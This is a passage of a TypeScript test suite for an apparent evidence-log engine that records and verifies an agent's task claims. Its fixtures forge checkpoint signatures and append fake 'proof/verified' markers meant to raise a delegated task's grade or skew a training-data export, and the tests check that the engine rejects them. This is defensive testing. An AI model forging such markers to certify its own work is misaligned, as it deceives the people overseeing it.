  assert.equal(log.entries[0]!.count, recordsBefore,
    'the published leaf carries the honest checkpoint the scan backed up to')
  // W2-M3: a genuinely forged signature lands a chain fact even when an
  // honest predecessor outvotes it — the skip is on the record.
  assert.ok(fs.log.some(l => l.includes('ptl/publish-unadjudicated') && l.includes('failed adjudication and were skipped')),
    'the skipped twin is recorded as unadjudicated')
})

test('v0.25 (V4-M6): when NO candidate verifies, the publish refuses loudly and lists the rejected', async () => {
  const fs = MemoryFs.of(project())
  const engine = publishingEngine(fs)
  await engine.establishBaseline()
  const logPath = `${ROOT}/.proof/evidence.jsonl`
  // Rewrite EVERY checkpoint's signature in place (the sig is the last field
  // of each line and nothing after a mid-log line digests it in a way the
  // walk's checkpoint parser cares about beyond the chain-break channel the
  // audit owns): every candidate is now a forgery, and the scan has nothing
  // to back up to.
  const lines = ((await fs.readFile(logPath)) ?? '').split('\n').filter(l => l.trim().length > 0)
  let corrupted = 0
  const rewritten = lines.map(l => {
    try {
      const parsed = JSON.parse(l) as { kind?: unknown; sig?: unknown }
      if (parsed?.kind !== 'checkpoint' || typeof parsed.sig !== 'string') return l
      corrupted += 1
      return JSON.stringify({ ...parsed, sig: 'sig:ws-key:not-the-real-signature' })
    } catch {
      return l
    }
  })
  assert.ok(corrupted > 0, 'fixture: the chain carries signed checkpoints to corrupt')
  fs.mutate(logPath, `${rewritten.join('\n')}\n`)
  await assert.rejects(
    () => engine.publishCheckpoint(),
    /refusing to publish: every candidate checkpoint failed signature verification.*rejected: log line/,
    'the refusal names every rejected candidate by line',
  )
  assert.ok(fs.log.some(l => l.includes('ptl/publish-unadjudicated') && l.includes('failed signature verification')),
    'the refusal is a chain fact before it is a throw')
})

test('v0.25 (K1/V3-M10): an appended proof/verified marker above the floor lifts no own leg', async () => {
  // The V3-M10 family closes with the floor: slaQuote (v0.24), taskVerdict
  // own-leg and export changedPaths (both this batch) all read
  // marker-defined facts through the bounded pool. This chain carries NO
  // honest verdict marker at all — the only one is the append, claiming
  // 'proven'.
  const fs = MemoryFs.of(project())
  const engine = flooredContractEngine(fs)
  await engine.establishBaseline()
  const { taskId } = await engine.delegateTask({ claim: 'the migration is done' })
  await appendChainedMarker(fs, `${ROOT}/.proof/evidence.jsonl`, {
    label: 'proof/verified',
    grade: 'proven',
    claim: 'forged own-leg',
  })
  const verdict = await engine.taskVerdict({ taskId, ownGrade: 'proven' })
  assert.equal(verdict.aboveFloorMarkers, 1, 'the withheld append is counted, visible on the result')
  assert.ok(verdict.discrepancies !== undefined
    && verdict.discrepancies.some(d => d.includes('has no proof/verified marker on this chain to stand on')),
    'the own leg derives from NOTHING below the floor — the append lifts no grade')
  assert.notEqual(verdict.composed.grade, 'proven', 'a self-report standing on a forged marker certifies nothing')
})

test('v0.25 (K1/V3-M10): an appended proof/verified marker above the floor shapes no training dataset', async () => {
  // The export's changed-path context defaults to the latest proof/verified
  // marker's `changed` list. This engine's own markers record the count, not
  // the list — so the honest default is NO context; the append supplies a
  // list from above the floor. v0.24 read it (the dataset's change-set
  // context became the attacker's list, and under the default agent-only
  // filter the unresolvable attribution minted `provenanceUnresolved`);
  // v0.25 anchors on the newest NOTARISED verdict.
  const build = async (): Promise<{ fs: MemoryFs; engine: ProofEngine; logPath: string }> => {
    const fs = MemoryFs.of(project())
    const engine = flooredContractEngine(fs)
    await engine.establishBaseline()
    await engine.verify({ changed: ['src/a.ts'] })
    return { fs, engine, logPath: `${ROOT}/.proof/evidence.jsonl` }
  }
  const clean = await build()
  const attacked = await build()
  await appendChainedMarker(attacked.fs, attacked.logPath, {
    label: 'proof/verified',
    grade: 'stale',
    claim: 'forged dataset context',
    changed: ['src/attacker-context.ts'],
  })
  const cleanExport = await clean.engine.exportTrainingData({ provenanceFilter: 'agent-only' })
  const attackedExport = await attacked.engine.exportTrainingData({ provenanceFilter: 'agent-only' })
  assert.equal(attackedExport.manifest.provenanceUnresolved, cleanExport.manifest.provenanceUnresolved,
    'the above-floor changed list resolved nothing and voided nothing — both exports agree')
  assert.equal(attackedExport.manifest.provenanceUnresolved, undefined,
    'no unresolvable attribution was invented from the append (v0.24 minted the flag here)')
  assert.deepEqual(attackedExport.manifest.counts, cleanExport.manifest.counts,
    'the dataset itself is byte-for-byte the clean chain\'s')
})

test('v0.25 (V2-L8): a fresh bootstrap over a foreign chain warns instead of mixing silently', async () => {
  // The accidental-deployment shape: workspace A's engine established into
  // an evidence dir, and workspace B's config reuses it. B's bootstrap used
  // to append onto A's history with no signal at all. The warning is
  // verbose-only and read-only — no chain byte changes either way, and an
  // honest resume (same workspace identity) says nothing.
  const fs = MemoryFs.of(project())
  const first = new ProofEngine({
    root: ROOT, fs, commands: new FakeCommands(), workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(), workspaceKey: 'ws-a', impactGraphLimit: 1_000,
  })
  await first.establishBaseline()
  const secondWarnings: string[] = []
  const second = new ProofEngine({
    root: ROOT, fs, commands: new FakeCommands(), workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(), workspaceKey: 'ws-b', impactGraphLimit: 1_000,
    verbose: true, logger: m => secondWarnings.push(m),
  })
  await second.establishBaseline()
  assert.ok(secondWarnings.some(w => w.includes('WARNING') && w.includes('ws-b') && w.includes('foreign chain')),
    'the bootstrap names the identity mismatch before appending to the foreign history')
  const thirdWarnings: string[] = []
  const third = new ProofEngine({
    // The honest-resume control needs a log ONLY ws-a ever wrote to.
    root: ROOT, fs: MemoryFs.of(project()), commands: new FakeCommands(), workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(), workspaceKey: 'ws-a', impactGraphLimit: 1_000,
    verbose: true, logger: m => thirdWarnings.push(m),
  })
  await third.establishBaseline()
  const resumedWarnings: string[] = []
  const resumed = new ProofEngine({
    root: ROOT, fs: third.fsView as MemoryFs, commands: new FakeCommands(), workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(), workspaceKey: 'ws-a', impactGraphLimit: 1_000,
    verbose: true, logger: m => resumedWarnings.push(m),
  })
  await resumed.establishBaseline()
  assert.ok(!resumedWarnings.some(w => w.includes('foreign chain')),
    'an honest resume under one identity says nothing (the log is its own)')
})
